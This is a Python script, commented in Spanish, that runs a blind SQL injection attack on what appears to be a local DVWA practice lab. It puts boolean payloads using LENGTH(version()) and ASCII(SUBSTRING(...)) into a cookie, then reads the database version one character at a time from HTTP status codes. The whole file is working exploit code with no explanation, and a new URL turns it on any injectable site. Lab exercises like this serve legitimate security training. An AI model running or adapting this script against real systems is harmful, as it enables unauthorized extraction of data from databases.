import requests
import time

# URL de la vulnerabilidad
url = "http://localhost/vulnerabilities/sqli_blind/"

# Tu PHPSESSID válido
PHPSESSID = "adee39c0895dcf9df0ea175c97bb87f0"

# Función que evalúa si la condición es verdadera (HTTP 200 OK)
def check(payload):
    cookies = {
        "id": payload,
        "security": "high",
        "PHPSESSID": PHPSESSID
    }
    r = requests.get(url, cookies=cookies)
    return r.status_code == 200

# Paso 1: Detectar longitud
print("[*] Detectando longitud de la versión...")
length = None

for i in range(1, 50):
    payload = f"1' AND LENGTH(version())={i}-- -"
    if check(payload):
        print(f"Longitud detectada: {i}")
        length = i
        break
    time.sleep(0.2)

if length is None:
    print("No se pudo detectar la longitud.")
    exit()

# Paso 2: Extraer carácter por carácter
print("[*] Extrayendo versión de la base de datos...")
version = ""

for i in range(1, length + 1):
    for c in range(32, 127):  # Solo caracteres imprimibles
        payload = f"1' AND ASCII(SUBSTRING(version(),{i},1))={c}-- -"
        if check(payload):
            version += chr(c)
            print(f"[{i}] {chr(c)}", end='', flush=True)
            break
        time.sleep(0.1)

